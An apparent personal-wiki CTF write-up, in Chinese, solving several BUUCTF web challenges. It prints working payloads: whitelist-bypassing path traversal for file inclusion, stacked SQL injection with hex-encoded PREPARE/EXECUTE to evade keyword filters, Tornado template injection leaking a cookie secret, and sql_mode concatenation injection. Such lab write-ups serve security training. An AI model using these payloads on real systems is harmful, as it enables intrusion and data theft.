<!DOCTYPE HTML>
<html>
<head>
    <link rel="Stylesheet" type="text/css" href="/wiki/static/css/style.css">
    <link rel="Stylesheet" type="text/css" href="/wiki/static/css/tango.css">
    <link rel="shortcut icon" href="/wiki/favicon.ico" type="image/x-icon">
    <link rel="icon" href="/wiki/favicon.ico" type="image/x-icon">
    <title>BUUCTF-WEB-WriteUp - Curtails's personal knowledge wiki</title>
    <meta name="keywords" content="Technology, CTF, Network Security"/>
    <meta name="description" content="A wiki website of Curtails when I learned new knowledgy."/>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width" />

    <script type="text/x-mathjax-config">
        MathJax.Hub.Config({
          tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
        });
        </script>
    <script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>


    <script>
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','','ga');

        ga('create', 'UA-78529611-1', 'auto');
        ga('send', 'pageview');

    </script>
</head>

<body>
<div id="container">
    
<div id="header">
  <div id="post-nav"><a href="/wiki/">Home</a>&nbsp;»&nbsp;<a href="/wiki/#CTF\BUUCTF">CTF\BUUCTF</a>&nbsp;»&nbsp;BUUCTF-WEB-WriteUp</div>
</div>
<div class="clearfix"></div>
<div id="title">BUUCTF-WEB-WriteUp</div>
<div id="content">
  <h2 id="hctf-2018warmup">[HCTF 2018]WarmUp</h2>
<p>打开网址显示一个滑稽 查看源码提示<code>source.php</code><br />
- 打开/source.php 查看源码</p>
<div class="hlcode"><pre><span class="cp">&lt;?php</span>
    <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
    <span class="k">class</span> <span class="nc">emmm</span>
    <span class="p">{</span>
        <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">checkFile</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$page</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="nv">$whitelist</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;source&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;source.php&quot;</span><span class="p">,</span><span class="s2">&quot;hint&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;hint.php&quot;</span><span class="p">];</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$page</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$page</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">echo</span> <span class="s2">&quot;you can&#39;t see it&quot;</span><span class="p">;</span>
                <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$page</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="nv">$_page</span> <span class="o">=</span> <span class="nb">mb_substr</span><span class="p">(</span>
                <span class="nv">$page</span><span class="p">,</span>
                <span class="mi">0</span><span class="p">,</span>
                <span class="nb">mb_strpos</span><span class="p">(</span><span class="nv">$page</span> <span class="o">.</span> <span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span><span class="p">)</span>
            <span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$_page</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="nv">$_page</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$page</span><span class="p">);</span>
            <span class="nv">$_page</span> <span class="o">=</span> <span class="nb">mb_substr</span><span class="p">(</span>
                <span class="nv">$_page</span><span class="p">,</span>
                <span class="mi">0</span><span class="p">,</span>
                <span class="nb">mb_strpos</span><span class="p">(</span><span class="nv">$_page</span> <span class="o">.</span> <span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span><span class="p">)</span>
            <span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$_page</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">echo</span> <span class="s2">&quot;you can&#39;t see it&quot;</span><span class="p">;</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span>
        <span class="o">&amp;&amp;</span> <span class="nb">is_string</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span>
        <span class="o">&amp;&amp;</span> <span class="nx">emmm</span><span class="o">::</span><span class="na">checkFile</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span>
    <span class="p">)</span> <span class="p">{</span>
        <span class="k">include</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
        <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg</span><span class="se">\&quot;</span><span class="s2"> /&gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>  
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>


<ul>
<li>class emmm中checkFile中有一段</li>
</ul>
<div class="hlcode"><pre><span class="x">$whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span>
</pre></div>


<p>访问hint.php<br />
显示<code>flag not here, and flag in ffffllllaaaagggg</code><br />
- 回去看source.php源码</p>
<div class="hlcode"><pre><span class="x">if (! empty($_REQUEST[&#39;file&#39;])</span>
<span class="x">        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])</span>
<span class="x">        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])</span>
<span class="x">    ) {</span>
<span class="x">        include $_REQUEST[&#39;file&#39;];</span>
<span class="x">        exit;</span>
<span class="x">    }</span>
</pre></div>


<p>当满足三个条件 file值不为空 file值为字符串 checkFile为真 执行file <code>任意文件包含</code><br />
- 前两个条件容易满足 关键checkFile返回真<br />
此函数有多处返回真代码 可以利用的代码片段是两处<br />
- 第一处利用代码</p>
<div class="hlcode"><pre><span class="x"> $_page = mb_substr(</span>
<span class="x">                $page,</span>
<span class="x">                0,</span>
<span class="x">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span>
<span class="x">            );</span>
<span class="x">            if (in_array($_page, $whitelist)) {</span>
<span class="x">                return true;</span>
<span class="x">            }</span>
</pre></div>


<p>这一段代码条件满足字符串中<code>?</code>之前的字符串在whitelist中也就是source.php或hint.php后面紧跟../包含ffffllllaaaagggg<br />
经测试需要四层../../../../<br />
构造payload<code>?file=source.php?/../../../../ffffllllaaaagggg</code>或<code>?file=hint.php?/../../../../ffffllllaaaagggg</code><br />
- 第二处利用代码</p>
<div class="hlcode"><pre><span class="x">            $_page = urldecode($page);</span>
<span class="x">            $_page = mb_substr(</span>
<span class="x">                $_page,</span>
<span class="x">                0,</span>
<span class="x">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span>
<span class="x">            );</span>
<span class="x">            if (in_array($_page, $whitelist)) {</span>
<span class="x">                return true;</span>
<span class="x">            }</span>
</pre></div>


<p>字符串经过一次url解码 在进行同上步骤 所以<code>?</code>两次url编码为<code>%253f</code><br />
构造payload<code>?file=source.php%253f/../../../../ffffllllaaaagggg</code>或<code>?file=hint.php%253f/../../../../ffffllllaaaagggg</code><br />
- flag{2d960f01-7d02-446e-9888-d9a08d6f266a}</p>
<h2 id="2019">[强网杯 2019]随便注</h2>
<p>一道SQL注入题目<br />
堆叠注入题目(堆叠注入就是将一堆sql语句叠加在一起执行，使用分号结束上一个语句再叠加其他语句一起执行)<br />
- <code>1'#</code>有回显 说明参数使用单引号闭合<br />
- 紧接着确定有多少列<code>1' order by 2#</code>有回显 <code>1' order by 3#</code>报错 确定两列<br />
- union查一下<code>1' union select 1,2#</code> 显示<code>return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);</code>存在关键字过滤<br />
- 这时我们就只能试一下堆叠注入<code>1'; show databases#</code> 爆出一堆数据库 不知该下手哪一个<br />
- 爆一下表<code>1'; show tables#</code> 两个表<code>1919810931114514</code>和<code>words</code><br />
- 爆一下两个表的列</p>
<div class="hlcode"><pre><span class="mi">1</span><span class="err">&#39;</span><span class="p">;</span><span class="n">desc</span> <span class="err">`</span><span class="mi">1919810931114514</span><span class="err">`</span><span class="p">;</span><span class="err">#</span>
<span class="mi">1</span><span class="err">&#39;</span><span class="p">;</span><span class="n">desc</span> <span class="err">`</span><span class="n">words</span><span class="err">`</span><span class="p">;</span><span class="err">#</span>
</pre></div>


<p>回显证明1919810931114514表是有flag列<br />
- 没法用select直接获取flag 利用预处理 set用大小绕过</p>
<div class="hlcode"><pre><span class="n">SET</span> <span class="err">@</span><span class="n">sql</span> <span class="o">=</span> <span class="n">sql</span><span class="err">语句</span><span class="p">;</span>  <span class="c1">//设置变量</span>
<span class="n">PREPARE</span> <span class="n">yuchuli</span> <span class="n">from</span> <span class="err">@</span><span class="n">sql</span><span class="p">;</span>   <span class="c1">//预定义SQL语句</span>
<span class="n">EXECUTE</span> <span class="n">yuchuli</span><span class="p">;</span>  <span class="c1">//执行预定义SQL语句sqla</span>
</pre></div>


<ul>
<li>构造payload</li>
</ul>
<div class="hlcode"><pre><span class="n">SET</span> <span class="err">@</span><span class="n">sql</span> <span class="o">=</span> <span class="n">select</span> <span class="o">*</span> <span class="n">from</span> <span class="err">`</span><span class="mi">1919810931114514</span><span class="err">`</span><span class="p">;</span>
<span class="n">PREPARE</span> <span class="n">yuchuli</span> <span class="n">from</span> <span class="err">@</span><span class="n">sql</span><span class="p">;</span> 
<span class="n">EXECUTE</span> <span class="n">yuchuli</span><span class="p">;</span>
</pre></div>


<p>由于select被过滤 可以用0x编码sql语句<br />
最终payload</p>
<div class="hlcode"><pre><span class="mi">1</span><span class="err">&#39;</span><span class="p">;</span><span class="n">SET</span> <span class="err">@</span><span class="n">sql</span> <span class="o">=</span> <span class="mh">0x73656C656374202A2066726F6D20603139313938313039333131313435313460</span><span class="p">;</span>
<span class="n">PREPARE</span> <span class="n">yuchuli</span> <span class="n">from</span> <span class="err">@</span><span class="n">sql</span><span class="p">;</span> 
<span class="n">EXECUTE</span> <span class="n">yuchuli</span><span class="p">;</span><span class="err">#</span>
</pre></div>


<ul>
<li>flag{2a64100c-3609-4340-99ce-a18b818d9d23}</li>
</ul>
<h2 id="easy_tornado">easy_tornado</h2>
<ul>
<li>打开网页显示</li>
</ul>
<div class="hlcode"><pre><span class="o">/</span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
<span class="o">/</span><span class="n">welcome</span><span class="p">.</span><span class="n">txt</span>
<span class="o">/</span><span class="n">hints</span><span class="p">.</span><span class="n">txt</span>
</pre></div>


<p>打开分别回显及对应url</p>
<div class="hlcode"><pre><span class="n">flag</span> <span class="n">in</span> <span class="o">/</span><span class="n">fllllllllllllag</span>    <span class="o">/</span><span class="n">file</span><span class="o">?</span><span class="n">filename</span><span class="o">=/</span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">filehash</span><span class="o">=</span><span class="mi">1</span><span class="n">de1224fd807cf95a218e546956e98c2</span>
<span class="n">render</span>                      <span class="o">/</span><span class="n">file</span><span class="o">?</span><span class="n">filename</span><span class="o">=/</span><span class="n">welcome</span><span class="p">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">filehash</span><span class="o">=</span><span class="n">eac6557dcd24438b369890a4f2d1059a</span>
<span class="n">md5</span><span class="p">(</span><span class="n">cookie_secret</span><span class="o">+</span><span class="n">md5</span><span class="p">(</span><span class="n">filename</span><span class="p">))</span>    <span class="n">file</span><span class="o">?</span><span class="n">filename</span><span class="o">=/</span><span class="n">hints</span><span class="p">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">filehash</span><span class="o">=</span><span class="n">cf83e929dfd5900716ae2e9c2a64e715</span>
</pre></div>


<ul>
<li>试一下<code>file?filename=/fllllllllllllag&amp;filehash=cf83e929dfd5900716ae2e9c2a64e715</code>报错ERROR 并且url<code>error?msg=Error</code></li>
<li>tornado框架存在handler.settings尝试<code>/error?msg={{handler.settings}}</code><br />
得到cookie<code>459f40bc-9132-48a7-a82e-9409e8d51a00</code></li>
<li>根据md5(cookie_secret+md5(filename))得到filehash<code>97582610e7ca4534ab0858894d38a167</code></li>
<li>构造payload<code>/file?filename=/fllllllllllllag&amp;filehash=97582610e7ca4534ab0858894d38a167</code>回显flag</li>
<li>flag{62662099-e484-4bd1-9ff0-7e55496fd9b1}</li>
</ul>
<h2 id="2019_1">[强网杯 2019]高明的黑客</h2>
<p>下载的压缩文件 3002个php文件 打开都是垃圾代码<br />
本题是fuzz </p>
<h2 id="suctf-2019easysql">[SUCTF 2019]EasySQL</h2>
<p>sql注入<br />
- 输入0无回显 输入非0回显<code>Array ( [0] =&gt; 1 )</code> 输入flag回显<code>Nonono.</code><br />
- 输入<code>1'</code>无回显<br />
- 堆叠注入爆表<code>1;show tables#</code>回显<code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag )</code><br />
- 综上述判断内置的sql语句<code>select 输入的数据||内置的一个列名 from 表名</code>进一步判定<code>select post_data || flag from Flag</code><br />
- 这里有两种解法<br />
第一种</p>
<div class="hlcode"><pre><span class="err">第一种这里对字符过滤有所疏忽</span>  <span class="err">譬如</span><span class="o">*</span><span class="err">就没有过滤</span> <span class="err">所以</span> <span class="err">注入`</span><span class="o">*</span><span class="p">,</span><span class="mi">1</span><span class="err">`</span> <span class="n">sql</span><span class="err">语句拼接成`</span><span class="n">select</span> <span class="o">*</span><span class="p">,</span><span class="mi">1</span> <span class="o">||</span> <span class="n">flag</span> <span class="n">from</span> <span class="n">Flag</span><span class="err">`也就是`</span><span class="n">select</span> <span class="o">*</span><span class="p">,</span><span class="mi">1</span> <span class="n">from</span> <span class="n">Flag</span><span class="err">`</span>
<span class="err">回显`</span><span class="n">Array</span> <span class="p">(</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">flag</span><span class="p">{</span><span class="mi">3536</span><span class="n">a21c</span><span class="o">-</span><span class="n">ca9e</span><span class="o">-</span><span class="mi">44</span><span class="n">ca</span><span class="o">-</span><span class="mi">888</span><span class="n">b</span><span class="o">-</span><span class="mi">75357</span><span class="n">b6df1c0</span><span class="p">}</span> <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mi">1</span> <span class="p">)</span><span class="err">`</span>
</pre></div>


<p>第二种</p>
<div class="hlcode"><pre><span class="err">第二种才是预期解法使用`</span><span class="n">set</span> <span class="n">sql_mode</span><span class="o">=</span><span class="n">pipes_as_concat</span><span class="p">;</span><span class="err">`将</span><span class="o">||</span><span class="err">变成字符串拼接而不是</span><span class="n">or</span> <span class="err">注入`</span><span class="mi">1</span><span class="p">;</span><span class="n">set</span> <span class="n">sql_mode</span><span class="o">=</span><span class="n">pipes_as_concat</span><span class="p">;</span><span class="n">select</span> <span class="mi">1</span><span class="err">`</span><span class="n">sql</span><span class="err">语句拼接成`</span><span class="n">select</span> <span class="mi">1</span><span class="p">;</span><span class="n">set</span> <span class="n">sql_mode</span><span class="o">=</span><span class="n">pipes_as_concat</span><span class="p">;</span><span class="n">select</span> <span class="mi">1</span> <span class="o">||</span> <span class="n">flag</span> <span class="n">from</span> <span class="n">Flag</span><span class="err">`</span> <span class="err">其中`</span><span class="n">select</span> <span class="mi">1</span> <span class="o">||</span> <span class="n">flag</span> <span class="n">from</span> <span class="n">Flag</span><span class="err">`是将</span><span class="mi">1</span><span class="err">与</span><span class="n">flag</span><span class="err">输出内容就行拼接</span> 
<span class="err">回显`</span><span class="n">Array</span> <span class="p">(</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mi">1</span> <span class="p">)</span> <span class="n">Array</span> <span class="p">(</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mf">1f</span><span class="n">lag</span><span class="p">{</span><span class="mi">3536</span><span class="n">a21c</span><span class="o">-</span><span class="n">ca9e</span><span class="o">-</span><span class="mi">44</span><span class="n">ca</span><span class="o">-</span><span class="mi">888</span><span class="n">b</span><span class="o">-</span><span class="mi">75357</span><span class="n">b6df1c0</span><span class="p">}</span> <span class="p">)</span><span class="err">`</span>
</pre></div>
</div>
<div id="content-footer">Created in <span class="create-date date"> 2019-10-10 01:01 </span></div>

</div>
<div id="footer">
            <span>
                Copyright © 2019 Curtails.
                Powered by <a href="http://simiki.org/" target="_blank">Simiki</a>.
                Fork me in <a href="" target="_blank"> github </a>.
            </span>
</div>


<!--百度统计-->
<script>
    var _hmt = _hmt || [];
    (function() {
        var hm = document.createElement("script");
        hm.src = "";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>


</body>
</html>